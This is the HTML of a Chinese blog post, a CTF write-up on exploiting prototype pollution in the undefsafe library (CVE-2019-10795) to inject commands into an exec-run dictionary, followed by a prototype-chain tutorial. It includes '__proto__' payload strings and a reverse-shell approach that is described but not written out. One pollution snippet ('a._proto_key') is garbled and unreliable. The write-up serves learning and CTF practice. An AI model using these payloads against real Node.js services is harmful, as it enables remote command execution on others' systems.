@@ -1,0 +1,206 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>BUUCTF_WEB(四) | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
+
+  
+  <meta name="author" content="Aesm1p">
+  
+
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="PrototypePollution">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="BUUCTF_WEB(四)"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>BUUCTF_WEB(四)</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2020/09/24/buuctf3/" rel="bookmark">
+        <time class="entry-date published" datetime="2020-09-23T16:00:00.000Z">
+          2020-09-24
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>原型链污染学习</p>
+<a id="more"></a>
+<h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>undefsafe存在原型链漏洞，CVE编号为CVE-2019-10795，undefsafe是一个简单的函数，能够检索深层对象属性值从而避免出现<code>Cannot read property &#39;X&#39; of undefined</code>错误。例如下列代码段：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line">    a:&#123;</span><br><span class="line">        b:&#123;</span><br><span class="line">            c:<span class="number">1</span>,</span><br><span class="line">            d:<span class="string">'aesm1p'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>如果此时我们打印不存在的变量，会导致报错</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.a.b);</span><br><span class="line"><span class="comment">//&#123; c: 1, d: 'aesm1p' &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.a.f);</span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.e.f);</span><br><span class="line"><span class="comment">//Uncaught TypeError: Cannot read property 'f' of undefined</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，由于访问到了不存在的属性的属性，导致了报错，如果程序运行中遇到这个问题报错终止会很麻烦，而undefsafe模块则可以解决这个问题</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(undef(obj,<span class="string">'a.b'</span>));</span><br><span class="line"><span class="comment">//&#123; c: 1, d: 'aesm1p' &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(undef(obj,<span class="string">'a.f'</span>));</span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(undef(obj,<span class="string">'e.f'</span>));</span><br><span class="line"><span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>
+<p>该函数还能对不存在的属性进行赋值</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj);</span><br><span class="line"><span class="comment">//&#123; a: &#123; b: &#123; c: 1, d: 'aesm1p' &#125; &#125; &#125;</span></span><br><span class="line"><span class="keyword">var</span> res = undef(obj,<span class="string">'e.f'</span>,<span class="string">'new'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj);</span><br><span class="line"><span class="comment">//&#123; a: &#123; b: &#123; c: 1, d: 'aesm1p' &#125; &#125;, f: 'new' &#125;</span></span><br></pre></td></tr></table></figure>
+<p><strong>漏洞细节</strong></p>
+<p>漏洞出现原因在于原型链污染，如下列代码段，a函数会被欺骗通过<code>__proto__</code>来增加或者修改<code>Object.prototype</code>的属性值，例如</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br><span class="line"><span class="comment">//JHU</span></span><br></pre></td></tr></table></figure>
+<p>那么回到本题中，用到了<code>undefsafe</code>模块的代码段有两处</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">get_note(id) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">    undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>get_note函数传入两个参数，edit_note函数的undefsafe模块存在原型链攻击<br>查看代码，发现status路由存在命令执行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;</span><br><span class="line">                shell: <span class="string">'/bin/bash'</span></span><br><span class="line">            &#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">"ok"</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+<p>通过原型链污染，将我们命令注入到commands即可，代码测试:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line">note_list=&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> id=<span class="string">'__proto__.aaa'</span>;</span><br><span class="line"><span class="keyword">var</span> author = <span class="string">'aesm1p'</span>;</span><br><span class="line"><span class="keyword">var</span> raw = <span class="string">'test'</span>;</span><br><span class="line">undefsafe(note_list, id+<span class="string">'.author'</span>,author);</span><br><span class="line"><span class="keyword">let</span> commands = &#123;</span><br><span class="line">    <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">    <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line"> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(commands[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//uptime</span></span><br><span class="line"><span class="comment">//free -m</span></span><br><span class="line"><span class="comment">//aesm1p</span></span><br></pre></td></tr></table></figure>
+<p>可以看到我们的输入被成功执行，但是为什么字典遍历会遍历到我们输入的属性呢，这是因为</p>
+<blockquote>
+<p>for…in 循环只遍历可枚举属性（包括它的原型链上的可枚举属性）。像 Array和 Object使用内置构造函数所创建的对象都会继承自Object.prototype和String.prototype的不可枚举属性，例如 String 的 indexOf()  方法或 Object的toString()方法。循环将遍历对象本身的所有可枚举属性，以及对象从其构造函数原型中继承的属性（更接近原型链中对象的属性覆盖原型属性）</p>
+</blockquote>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>攻击过程如下：<br>在buuoj上开启一个靶机，确定IP地址，监听端口用来反弹shell<br>访问edit_note页面，进行原型链污染，写入反弹shell命令<br><img src="/2020/09/24/buuctf3/1.png" alt><br>然后访问status页面触发命令执行<br><img src="/2020/09/24/buuctf3/2.png" alt><br>读取flag即可<br><img src="/2020/09/24/buuctf3/3.png" alt></p>
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>既然碰到了原型链的题目，就顺便学习一下原型链的原理</p>
+<h2 id="JavaScript原型链"><a href="#JavaScript原型链" class="headerlink" title="JavaScript原型链"></a>JavaScript原型链</h2><p>既然说到了原型链污染,就势必要弄清楚什么是原型链,在找了很多文章之后,发现阮一峰师傅是讲的最清楚明白的,跟着他的思路来理解什么是原型链。</p>
+<p>JavaScript在创建之初就是作为浏览器的前端语言的,而且是面向对象的一个语言,那么涉及到对象,就势必要有继承机制,种种机缘之下, js作者放弃了在c++或java等语言上使用的类的继承机制,而是自己实现了一种机制来实现继承,这就是原型链。那么具体是怎么做的呢?</p>
+<p>我们先创建一个对象(JS中一切皆对象)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DOG</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.species = <span class="string">'犬科'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dog1 = <span class="keyword">new</span> DOG(<span class="string">'dog1'</span>);</span><br><span class="line"><span class="keyword">var</span> dog2 = <span class="keyword">new</span> DOG(<span class="string">'dog2'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dog1.name);</span><br><span class="line"><span class="built_in">console</span>.log(dog2.name);</span><br><span class="line"><span class="comment">//dog1</span></span><br><span class="line"><span class="comment">//dog2</span></span><br></pre></td></tr></table></figure>
+<p>假如此时我们修改dog1的属性</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dog1.species = <span class="string">'猫科'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(dog1.species);</span><br><span class="line"><span class="built_in">console</span>.log(dog2.species);</span><br><span class="line"><span class="comment">//猫科</span></span><br><span class="line"><span class="comment">//犬科</span></span><br></pre></td></tr></table></figure>
+<p>可以看到,对于dog1的修改没有在dog2中生效,即两个类无法共享数据,这样显然是不合理的,此时我们可以使用原型链来解决这个问题</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DOG</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="comment">//this.species = '犬科';</span></span><br><span class="line">&#125;;</span><br><span class="line">DOG.prototype.species = <span class="string">'犬科'</span>;</span><br><span class="line"><span class="keyword">var</span> dog1 = <span class="keyword">new</span> DOG(<span class="string">'dog1'</span>);</span><br><span class="line"><span class="keyword">var</span> dog2 = <span class="keyword">new</span> DOG(<span class="string">'dog2'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dog1.species);</span><br><span class="line"><span class="built_in">console</span>.log(dog2.species);</span><br><span class="line">DOG.prototype.species = <span class="string">'猫科'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(dog1.species);</span><br><span class="line"><span class="built_in">console</span>.log(dog2.species);</span><br><span class="line"><span class="comment">//犬科</span></span><br><span class="line"><span class="comment">//犬科</span></span><br><span class="line"><span class="comment">//猫科</span></span><br><span class="line"><span class="comment">//猫科</span></span><br></pre></td></tr></table></figure>
+<p>可以看到使用原型链可以实现数据共享,相当于实现了类的继承,原型链主要是通过<code>prototype</code>属性实现的, <code>prototype</code>属性指向一个原型空间,可以理解为实例可以共同访问的空间，间接实现了继承。</p>
+<p><strong><strong>proto</strong>和prototype</strong></p>
+<blockquote>
+<p>由于markdown语法的原因,下文用<code>proto</code>来指代<code>__proto__</code></p>
+</blockquote>
+<p>这两个属性经常让人傻傻分不清楚,这里记录一下我的个人理解</p>
+<p>prototype是函数才会有的,而proto是对象所独有的,由于js万物皆对象，所以函数也有prototype属性, prototype可以理解为指向原型空间的一个属性,所以函数需要该属性来实现继承,而proto是对象所具有的属性,当访问本对象内部不存在的属性时就会去访问proto指向的(父)对象里面寻找,父对象如果找不到会继续透过父对象的proto属性上溯,直至返回null取值触发报错,这样层层上溯就形成了所谓的原型链</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> one = &#123;<span class="string">'x'</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="built_in">console</span>.log(one.__proto__ === obj.prototype);</span><br><span class="line"><span class="built_in">console</span>.log(one.__proto__ === <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="comment">//true 在JS中，所有类都最初继承自Object</span></span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">son1 = <span class="keyword">new</span> Father();</span><br><span class="line">son2 = <span class="keyword">new</span> Father();</span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === son2.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === Father.prototype);</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="comment">//true 两个实例均指向同一个父类的原型空间</span></span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === obj.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === <span class="built_in">Object</span>());</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__.__proto__ === <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="comment">//true son1继承自Father，Father继承自Object，所以两次上溯就访问到了Object的原型空间</span></span><br></pre></td></tr></table></figure>
+<h2 id="原型链污染-1"><a href="#原型链污染-1" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>有了以上知识的铺垫,那么思维发散一下就会发现,如果我们通过一proto-修改父类属性,乃至直接上溯到修改Object的类属性,不就可以间接影响到其它类的属性吗?例如下段代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">'key'</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.log (a.key);</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line">a._proto_key = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.key);</span><br><span class="line"><span class="comment">//1:因为a已经有key属性了,不会再向父类上溯了,所以值不变</span></span><br><span class="line">b = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(b.key);</span><br><span class="line"><span class="comment">//向父类继承了key属性,值为2</span></span><br></pre></td></tr></table></figure>
+<p>可以看到新建的b对象虽然为空,但是key属性居然是2,这样就实现了原型链污染。<br>在实际环境中,我们需要寻找能够通过属性键名修改属性值的方法,就有机会触发该漏洞,常用方法有<code>merge</code>和<code>clone</code>等操作</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.ruanyifeng.com/blog/2011/06/designing_ideas_of_inheritance_mechanism_in_javascript.html" target="_blank" rel="noopener">Javascript继承机制的设计思想</a><br><a href="https://blog.csdn.net/cc18868876837/article/details/81211729" target="_blank" rel="noopener">https://blog.csdn.net/cc18868876837/article/details/81211729</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解JavaScript Prototype污染攻击</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/CTF/">CTF</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/PrototypePollution/">PrototypePollution</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
